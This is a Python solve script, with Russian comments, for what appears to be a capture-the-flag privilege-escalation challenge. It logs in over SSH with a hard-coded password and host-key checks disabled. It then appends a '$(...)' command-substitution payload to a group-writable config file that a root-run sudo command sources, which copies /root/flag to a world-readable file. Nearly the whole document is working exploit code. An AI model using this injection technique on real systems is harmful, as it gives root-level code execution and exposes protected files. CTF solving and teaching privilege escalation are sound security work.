#!/usr/bin/env python3
"""privesc: подмена runtime.conf (source-инъекция) в root-сверке.

Идея решения:
  1. SSH-сессия под игроком player; sudo -l разрешает без пароля только
     root-команду /usr/local/sbin/reconcile.
  2. reconcile source-ит /srv/ledger/runtime.conf, а файл доступен на запись
     группе players (root:players 0664) — и исполняется bash'ом от root.
  3. Дописываем в конфиг присваивание ARCHIVE_TARGET с $(...): при source
     bash исполнит подстановку от root — она копирует /root/flag в /tmp,
     выдаёт копии права 644 и возвращает валидную цель сверки.
  4. Запускаем разрешённую сверку (sudo -n) — дописанный код срабатывает.
  5. Читаем /tmp/case-result уже под игроком: там флаг.

TLS-обёртка (ssh поверх openssl s_client): экспортируйте
  export SOLVE_SSH_OPTS='-o "ProxyCommand=openssl s_client -quiet -connect <host>:443 -servername <host>"'
(внутренние кавычки обязательны — опции парсятся через shlex.split).
"""
import os
import shlex
import subprocess
import sys

target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:13423"
host, port = target.rsplit(":", 1) if ":" in target else (target, "22")

# SOLVE_SSH_OPTS — доп. опции ssh (например, ProxyCommand поверх TLS);
# shlex.split уважает внутренние кавычки опций, обычный split сломал бы их
SSH = ["sshpass", "-p", "player", "ssh",
       "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "LogLevel=ERROR",
       "-p", port, f"player@{host}",
      ] + shlex.split(os.environ.get("SOLVE_SSH_OPTS", ""))

# 1. конфиг /srv/ledger/runtime.conf доступен на запись группе players;
#    root-сверка source-ит его в bash — дописываем подстановку команды
payload = r"ARCHIVE_TARGET=$(cp /root/flag /tmp/case-result; chmod 644 /tmp/case-result; echo /var/lib/ledger)"
# в payload нет одинарных кавычек, поэтому обёртка '{payload}' доносит его
# до удалённого printf без экранирования; >> дописывает строку в конец конфига
subprocess.run(SSH + [f"printf '%s\\n' '{payload}' >> /srv/ledger/runtime.conf"], check=True)

# 2. разрешённая root-сверка исполняет конфиг -> копия флага в /tmp
#    (capture_output: вывод сверки не нужен, важен только exit code)
subprocess.run(SSH + ["sudo -n /usr/local/sbin/reconcile"], check=True, capture_output=True)

# 3. читаем копию
#    (chmod 644 из пейлоада уже дал игроку право на чтение)
result = subprocess.run(SSH + ["cat /tmp/case-result"], capture_output=True, text=True, check=True)
print(result.stdout.strip())
